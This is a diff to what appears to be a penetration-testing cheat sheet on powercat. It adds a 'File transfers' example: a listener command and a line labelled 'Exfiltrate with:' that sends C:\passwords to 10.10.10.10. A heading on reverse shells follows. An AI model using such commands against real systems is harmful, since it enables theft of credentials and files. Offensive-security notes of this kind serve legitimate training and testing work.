@@ -12,7 +12,11 @@ powercat -h
 
 ## File transfers
 ```powershell
-powercat -c 10.10.10.10 -p 54321 -i C:\Users\Administrator\powercat.ps1
+# Recieve here:
+powercat -l -p 54321 -of $filename
+# Exfiltrate with:
+powercat -c 10.10.10.10 -p 54321 -i C:\passwords
+
 ```
 
 ## Reserve Shells
